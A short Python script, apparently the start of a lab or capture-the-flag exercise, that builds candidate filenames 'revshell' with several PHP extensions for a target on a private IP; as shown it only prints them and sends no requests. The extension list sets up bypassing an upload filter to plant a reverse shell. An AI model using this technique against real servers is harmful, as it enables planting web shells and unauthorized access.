#!/usr/bin/python3

import requests
import os

ip = "10.10.219.76"
url = f"http://{ip}:3333/internal/index.php"

filename = "revshell"

extensions = [
    ".php",
    ".php3",
    ".php4",
    ".php5",
    ".phtml",
]

for ext in extensions:
    file = filename + ext
    print(file)